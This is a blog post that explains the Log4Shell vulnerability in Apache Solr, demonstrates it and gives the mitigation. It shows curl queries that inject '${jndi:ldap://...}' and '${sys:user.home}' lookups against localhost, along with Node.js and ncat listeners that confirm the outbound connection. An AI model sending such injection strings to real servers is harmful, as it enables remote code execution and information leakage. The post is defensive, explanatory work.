# Log4Shell and Solr
Last week the disclosure of the [Log4Shell vulnerability](https://www.lunasec.io/docs/blog/log4j-zero-day/) took many of us Solr users by surprise. When I first heard about it I didn't pay much attention to it since I figured that the problem was that somebody had found how to leak information *into the Solr log files*, something that is bad but that has limited exposure. However, one of my colleagues pointed out that the vulnerability allowed for *remote code execution (RCE)* and that is indeed scary.

As it turns out `log4j`, the library that Solr uses to log information, can be configured to insert certain dynamic tokens of information and one of these tokens allows it to connect to a remote server to download code and execute it. I am not a Java developer so this was news to me and I got curious to see how this works in practice. 

In a Solr installation the problem can be triggered by a user submitting a search via our application. If the user submits a query that is logged and that query has the correct syntax to trigger the expansion then they can trigger the vulnerability. And this is surprisingly easy to do. 

To demonstrate this in this blog post I am using Solr `8.7.0` with the default logging settings, but there are [many versions of Solr affected](https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228) by this vulnerability. 


## Leaking information into the logs
One simple way of triggering this behavior in your local Solr is by issuing a simple command like this:

```
curl 'http://localhost:8983/solr/demo1/select?q=$\{sys:user.home\}'
```

The `${sys:user.home}` parameter in the URL is what causes `log4j` to execute the dynamic expansion as it logs the information. In this case it will log the name of the user name that Solr is running under.

You can validate this by looking at the Solr log file with a command like this  `cat ./solr-8.7.0/server/logs/solr.log`, the log will include a line with the following information:

```
2021-12-13 20:53:12.984 INFO  (qtp1845623216-26) [   x:demo1] o.a.s.c.S.Request [demo1]  webapp=/solr path=/select params={q=/Users/correah=} hits=0 status=0 QTime=0
``` 

Notice how the `q=${sys:user.home}` got expanded into `q=/Users/correah` when the line was logged by Solr. There are [many values that are supported](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) and that `log4j` knows how to process, I believe this expansion is known as Property Substitution in the Java world. 

Notice that the special token was passed on the `q` parameter to Solr, this is what I mean when I say that it is very easy for a user of our application to trigger the vulnerability. 

## Remote Code Execution

Leaking information into the logs like this is pretty bad, but the reason the vulnerability is scary is because one of the property substitutions that `log4j` supports allows it to connect to a remote host, download a piece of information, and execute it. This means that if a user submits a query through our application with the proper syntax, `log4j` will connect to a website controlled by this user and could force it to download and execute code on our servers.

This is possible is because one of the property substitutions that `log4j` recognizes allows to indicate a remote server. This is done via the `jndi` prefix. So if instead of passing a query like `${sys:user.home}` as we did before, we pass one that invokes `jndi` we can have our Solr connect to a remote host. 

For example let's say that we pass a query with `${jndi:ldap://127.0.0.1:9000/hello-world}` as shown below:

```
curl 'http://localhost:8983/solr/demo1/select?q=$\{jndi:ldap://127.0.0.1:9000/hello-world\}'
```

As `log4j` logs this query it will connect to a remote host, in this case it will connect to our local host on port `9000` via LDAP, but it could connect to any machine that the user indicates in the query string! The folks at Fastly have a [great explanation on how the remote code execution works in practice](https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j) for this vulnerability. 


## Reaching to a remote host
Since I am not a Java developer I found it pretty hard to validate that Solr is indeed connecting to a remote host when I issue a command with `${jndi:ldap://127.0.0.1:9000/hello-world}` in the query string. The Solr log looks pretty innocent since it logs the string as-is (i.e. it does not look like it expanded it into anything):

```
2021-12-13 21:17:49.801 INFO  (qtp1845623216-22) [   x:demo1] o.a.s.c.S.Request [demo1]  webapp=/solr path=/select params={q=${jndi:ldap://127.0.0.1:9000/hello-world}} status=400 QTime=0
```

However, I was able to write a little tiny TCP server in Node.js that allowed me to see that Solr was indeed reaching out to `127.0.0.1:9000`. The code that I wrote is listed below:

```
// tcpserver.js
// An simple server over TCP. Always returns "hello" and disconnects.
// Test with: "telnet localhost 9000" or "nc localhost 9000"
var net = require("net");
var port = 9000;
var server = net.createServer();

server.on('connection', function(socket) {
    // Show that somebody connected.
    var now = new Date();
    console.log("%s => connection from: %s", now.toISOString(), socket.remoteAddress + ":" + socket.remotePort);

    // Send back "hello" and disconnect.
    socket.write("hello\r\n");
    socket.destroy()
});

console.log("Started TCP listener on port:" + port);
server.listen(port);
```

With this code I was able to run `node tcpserver.js` and then issue `curl 'http://localhost:8983/solr/demo1/select?q=$\{jndi:ldap://127.0.0.1:9000/hello-world\}'` again and see the following in my terminal:

```
$ node tcpserver.js 
Started TCP listener on port:9000
2021-12-13T21:34:53.338Z => connection from: ::ffff:127.0.0.1:55748
```

Notice how it detected a `connection from ::ffff:127.0.0.1:55748`. This line is the result of `log4j` attempting to make the `ldap://127.0.0.1:9000/hello-world` connection. My little TCP server is not an LDAP server so it does not return the proper information for Solr to download code and execute it, but it does show that Solr is reaching out to a remote host just by crafting the proper search terms.

From what I understand the `jndi` prefix supports many kind of [communications protocols](https://stackoverflow.com/questions/4365621/what-is-jndi-what-is-its-basic-use-when-is-it-used) and it can connect via LDAP and DNS but not via HTTP. 

My tiny TCP server always return "hello" back to the client and disconnects, but a real LDAP server could return information that will fully exploit the server as indicated in the Fastly blog post.

If you are on Linux you can use [ncat](https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/) to validate that the remote connections are taking place instead of using the little TCP server that I showed here. Just run a command like this instead:

```
ncat -k -vv -c "echo ---CONNECTION [%NCAT_REMOTE_PORT%]--- 1>&2" -l 9000
```

## The fix
Apache Solr has [released a fix for this vulnerability](https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228). I was able to validate that if we start our Solr installation with the `Dlog4j2.formatMsgNoLookups=true` setting then Solr will not reach out to a remote host when it receives the `${jndi:ldap://127.0.0.1:9000/hello-world}` string. 

Below is an example of how to start Solr with this parameter:

```
SOLR_OPTS="-Dlog4j2.formatMsgNoLookups=true" ./solr start
```

The following screenshots shows how to confirm Solr is running with the `log4j2.formatMsgNoLookups=true` setting

![Log4j setting](https://hectorcorrea.com/images/solr_formatmsgnolookups.jpg)

Keep in mind that with this setting the dynamic expansion of tokens like `${sys:user.home}` still takes place, but Solr does not reach out to remote hosts. 